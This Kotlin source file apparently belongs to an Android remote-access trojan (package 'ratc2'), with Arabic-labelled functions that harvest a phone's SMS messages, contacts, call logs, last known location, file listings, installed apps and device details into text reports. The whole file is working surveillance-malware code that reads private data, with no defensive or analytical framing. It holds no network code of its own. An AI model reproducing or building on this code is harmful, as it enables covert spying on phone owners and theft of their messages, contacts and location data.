package com.spud.ratc2

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class Collectors(private val ctx: Context) {

    private val df = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    fun deviceInfo(): String = buildString {
        appendLine("=== معلومات الجهاز ===")
        appendLine("الشركة: ${Build.MANUFACTURER}")
        appendLine("الموديل: ${Build.MODEL}")
        appendLine("الاسم: ${Build.DEVICE}")
        appendLine("أندرويد: ${Build.VERSION.RELEASE}")
        appendLine("SDK: ${Build.VERSION.SDK_INT}")
        appendLine("المعالج: ${Build.HARDWARE}")
        appendLine("اللغة: ${Locale.getDefault()}")
    }

    fun batteryInfo(): String {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val mi = android.app.ActivityManager.MemoryInfo()
        am.getMemoryInfo(mi)
        val ramTotal = mi.totalMem / (1024 * 1024)
        val ramFree = mi.availMem / (1024 * 1024)
        return buildString {
            appendLine("=== البطارية والذاكرة ===")
            appendLine("البطارية: $pct%")
            appendLine("الرام الكلي: ${ramTotal}MB")
            appendLine("الرام الحر: ${ramFree}MB")
        }
    }

    fun storageInfo(): String {
        val d = StatFs(ctx.filesDir.path)
        val total = d.blockCountLong * d.blockSizeLong / (1024 * 1024 * 1024)
        val free = d.availableBlocksLong * d.blockSizeLong / (1024 * 1024 * 1024)
        return buildString {
            appendLine("=== الذاكرة التخزينية ===")
            appendLine("الكلية: ${total}GB")
            appendLine("الحرة: ${free}GB")
            appendLine("المستخدمة: ${total - free}GB")
        }
    }

    @SuppressLint("MissingPermission")
    fun location(): String {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val sb = StringBuilder("=== الموقع ===\n")
        for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
            lm.getLastKnownLocation(p)?.let {
                sb.appendLine("المصدر: $p")
                sb.appendLine("خط العرض: ${it.latitude}")
                sb.appendLine("خط الطول: ${it.longitude}")
                sb.appendLine("الدقة: ${it.accuracy} متر")
                sb.appendLine("الوقت: ${df.format(Date(it.time))}")
            }
        }
        if (sb.length < 20) sb.append("مافي موقع محفوظ")
        return sb.toString()
    }

    fun sms(limit: Int): String {
        val sb = StringBuilder("=== آخر $limit رسالة SMS ===\n")
        ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
            null, null, "${Telephony.Sms.DATE} DESC"
        )?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                val type = if (c.getInt(3) == Telephony.Sms.MESSAGE_TYPE_INBOX) "📩 وارد" else "📤 صادر"
                sb.appendLine("---")
                sb.appendLine("$type | ${c.getString(0)}")
                sb.appendLine("التاريخ: ${df.format(Date(c.getLong(2)))}")
                sb.appendLine("النص: ${c.getString(1)}")
                i++
            }
        }
        return sb.toString()
    }

    fun contacts(limit: Int): String {
        val sb = StringBuilder("=== $limit جهة اتصال ===\n")
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, null
        )?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                sb.appendLine("👤 ${c.getString(0)} | ${c.getString(1)}")
                i++
            }
        }
        return sb.toString()
    }

    fun calls(limit: Int): String {
        val sb = StringBuilder("=== آخر $limit مكالمة ===\n")
        ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
            null, null, "${CallLog.Calls.DATE} DESC"
        )?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                val t = when (c.getInt(1)) {
                    CallLog.Calls.INCOMING_TYPE -> "📥 وارد"
                    CallLog.Calls.OUTGOING_TYPE -> "📤 صادر"
                    CallLog.Calls.MISSED_TYPE   -> "❌ فائت"
                    else -> "?"
                }
                sb.appendLine("$t | ${c.getString(0)} | ${c.getInt(2)}ث | ${df.format(Date(c.getLong(3)))}")
                i++
            }
        }
        return sb.toString()
    }

    fun files(path: String): String {
        val f = File(path)
        if (!f.exists()) return "❌ ما لقيت: $path"
        val sb = StringBuilder("=== محتوى $path ===\n")
        f.listFiles()?.sortedBy { it.name }?.take(100)?.forEach {
            val icon = if (it.isDirectory) "📁" else "📄"
            val size = if (it.isFile) " (${it.length()}B)" else ""
            sb.appendLine("$icon ${it.name}$size")
        }
        return sb.toString()
    }

    fun apps(): String {
        val sb = StringBuilder("=== التطبيقات المثبتة ===\n")
        val pkgs = ctx.packageManager.getInstalledPackages(0).sortedBy { it.packageName }
        for (p in pkgs) {
            sb.appendLine("▪️ ${p.packageName}")
        }
        return sb.toString()
    }
}
